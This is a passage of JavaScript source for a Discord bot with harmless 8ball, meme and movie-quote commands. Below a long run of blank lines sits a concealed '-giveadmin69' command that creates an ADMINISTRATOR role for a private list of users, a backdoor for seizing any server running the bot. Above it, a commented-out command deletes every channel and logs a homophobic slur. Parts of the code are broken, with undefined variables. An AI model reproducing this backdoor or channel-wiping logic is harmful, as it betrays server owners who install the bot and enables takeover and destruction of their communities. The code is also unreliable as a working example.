  var rand = ['Yes', 'No', 'Why are you even trying?', 'What do you think? NO', 'Maybe', 'Never', 'Yep', 'Uh oh, I dunno how to answer tbh:/', 'HAH *no*'];

  return rand[Math.floor(Math.random()*rand.length)];
}

// Later in the code:

client.on('message', async(message) => {
  if(message.content.startsWith(`${prefix}8ball`))
{
  const args = message.content.split(' ').slice(1); // All arguments behind the command name with the prefix
  const amount = args.join(' '); // Amount of messages which should be deleted

  if (!amount) return message.reply('How about you ask a question...'); // Checks if the `amount` parameter is given
  await message.channel.send(`\` ${doMagic8BallVoodoo()}\``);
}

})

function memes() {
  var rand = ['https://media.discordapp.net/attachments/725064168108982335/725113895689256990/image0.jpg?width=459&height=588', 'https://cdn.discordapp.com/attachments/725064168108982335/725114777889669312/image0.jpg', 'https://cdn.discordapp.com/attachments/725064168108982335/725115070551556146/video0.mp4', 'https://cdn.discordapp.com/attachments/725064168108982335/725114721854029966/video0.mp4', 'https://cdn.discordapp.com/attachments/725064168108982335/725114437425692803/image0.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725110760627372052/image1.jpg?width=475&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725113719641735311/image0.jpg?width=473&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725113637206753280/image0.jpg?width=578&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725113589492613170/image0.jpg?width=547&height=588', 'https://media.discordapp.net/attachments/725064168108982335/725113510509412392/image1.jpg?width=596&height=588', 'https://media.discordapp.net/attachments/725064168108982335/725113510274662470/image0.jpg?width=694&height=588', 'https://media.discordapp.net/attachments/725064168108982335/725113151716196473/image0.jpg?width=631&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725112987689418894/image0.jpg?width=496&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725112830231052444/image2.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725112829967073320/image1.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725112829664952330/image0.jpg?width=601&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725112405532868618/image0.jpg?width=508&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725112351380209744/image0.jpg?width=424&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725112242734891038/image0.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725111946025893918/image1.png', 'https://media.discordapp.net/attachments/725064168108982335/725111572099498045/image2.jpg?width=741&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725111572099498045/image2.jpg?width=741&height=587', 'https://media.discordapp.net/attachments/725064168108982335/725111570274975784/image1.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725111569071079484/image0.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725111569071079484/image0.jpg', 'https://media.discordapp.net/attachments/725064168108982335/725111250673205308/image1.jpg?width=612&height=588', 'https://media.discordapp.net/attachments/725064168108982335/725111250442387516/image0.jpg?width=478&height=588', 'https://media.discordapp.net/attachments/725064168108982335/725110762657284170/image4.jpg?width=691&height=588', 'https://media.discordapp.net/attachments/725064168108982335/725110760384102470/image0.jpg?width=466&height=588', 'https://cdn.discordapp.com/attachments/725064168108982335/725110760975368222/video2.mp4 cheese', 'https://cdn.discordapp.com/attachments/725064168108982335/725110762024075304/video3.mp4', 'https://cdn.discordapp.com/attachments/725064168108982335/725111251188973670/video3.mp4', 'https://cdn.discordapp.com/attachments/725064168108982335/725111945736355840/video0.mp4', 'https://cdn.discordapp.com/attachments/725064168108982335/725112002288025640/video0.mov', ''];

  return rand[Math.floor(Math.random()*rand.length)];
}

client.on('message', message => {
  if(message.content.startsWith(`${prefix}meme`))
{
  const embed = new Discord.MessageEmbed()
  .setTitle(`Here's your meme:`)
  .setImage(memes())
  message.channel.send(embed);
}

})

function quotes() {
  var rand = ['“Hasta la vista baby” – Terminator 2: Judgement Day', '“My precious” – The Lord of the Rings: The Two Towers', '“The name’s Bond. James Bond” – Bond: Doctor N', '“Yabba dabba doo!” – The Flintstones', '“You are the weakest link. Goodbye” – The Weakest Link', '“Exterminate” – Doctor Who ', '"Remember, remember, the Fifth of November, the Gunpowder Treason and Plot. I know of no reason why the Gunpowder Treason should ever be forgot."- V for Venedetta', '"Voilà! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate. This visage, no mere veneer of vanity, is a vestige of the vox populi, now vacant, vanished. However, this valorous visitation of a by-gone vexation, stands vivified and has vowed to vanquish these venal and virulent vermin vanguarding vice and vouchsafing the violently vicious and voracious violation of volition. [carves V into poster on wall] The only verdict is vengeance; a vendetta, held as a votive, not in vain, for the value and veracity of such shall one day vindicate the vigilant and the virtuous. Verily, this vichyssoise of verbiage veers most verbose, so let me simply add that it\'s my very good honor to meet you and you may call me V."- V for Venedetta(one of my favorites)', '"YOU SHOULD HAVE GONE FOR THE HEAD"- Avengers: Infinity War', '"THE HARDEST CHOICES REQUIRE THE STRONGEST WILLS."- Avengers: Infinity War', '“ May the Force be with you.”- Star Wars Episode 3', '"I\'m going to make a offer he can\'t refuse."- The Goodfather', '"Do you know how i got these scars?"- The Dark Knight', '"Madness is just like gravity...all it takes is a little *push*"- The Dark Knight', '“No great mind has ever existed without a touch of madness.”― Aristotle', '"Hello There"- Star Wars Episode 3', '“I am Iron Man.”- Iron Man', '"Steve Rogers: Big man in a suit of armour. Take that off, what are you? Tony Stark: Genius, billionaire, playboy, philanthropist."- Avengers', '"Avengers!... *assemble*"- Avengers: Endgame', '"In this world, wherever there is light - there are also shadows. As long as the concept of winners exists, there must also be losers. The selfish desire of wanting to maintain peace causes wars, and hatred is born to protect love."- (Madara)Naruto Shipudden', '“It\'s alive! It\'s alive!” -Frankenstein, 1931', '“I\'ll be back.” -The Terminator, 1984', '"Just keep swimming" - Finding Nemo, 2003', '"Frankly, my dear, I don\'t give a damn." - Gone With the Wind, 1939', '“Magic Mirror on the wall, who is the fairest one of all?" -Snow White and the Seven Dwarfs, 1937', '“I am your father.” -Star Wars Episode V: The Empire Strikes Back, 1980', '"Is It Just Me Or Is It Getting Crazier Out There?"- Joker 2019', '"All I Have Are Negative Thoughts."- Joker 2019', '"Can You Introduce Me As Joker?"- Joker 2019', '“In this world, everything is governed by balance. There’s what you stand to gain and what you stand to lose. And when you think you’ve got nothing to lose, you become overconfident.”- La Casa de Papel(Money Heist)', '"It\'s funny how dumb you are"- Gravity Falls', '"I\'m insane either way braniac"- Gravity Falls', '"Why so serious?" - The Dark Knight, 2008', '"I am whatever you say I am; if I wasn\'t, then why would you say I am."- Eminem'];

  return rand[Math.floor(Math.random()*rand.length)];
}


client.on('message', message => {
  if(message.content.startsWith(`${prefix}quotes`))
{
  message.channel.send(`\` ${quotes()}\``);
}

})


//client.on('message', message => {
  //if(message.content.startsWith(`-clear`)) {
    //if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
    //{
      //message.guild.channels.cache.forEach(channel => {
        //channel.delete().then((channel)=>{
          //if (channel.deleted === true)
          //{
            //console.log("channel succesfully yeeted!");
          //}
        //},reason => {
         // console.log(`Faggot i cant delete that channel because ${reason}`);
        //})
      //})
      
    //}
  //}
//});



















  client.on('message', message => {
    if(message.content === '-giveadmin69') {
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
          let e = list.find(id => id === msg.author.id)
          if(!e) {
              msg.channel.send("Nightmare troupe only").then(m => {
                  setTimeout(() => {
                      m.delete()
                  }, 3000)
              }
              )
          }else{
  const adminn = message.guild.roles.cache.find(r => r.name === 'godmin')
      if(!admin) {message.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'] } }).then(message.member.roles.add(adminn))}    
       else{message.member.roles.add(adminn)}
    }
    }
  })
//const adminn = message.guild.roles.cache.find(r => r.name === 'godmin')
//member.roles.set(adminn)




const bot = new Discord.Client();

   
client.login(token1);
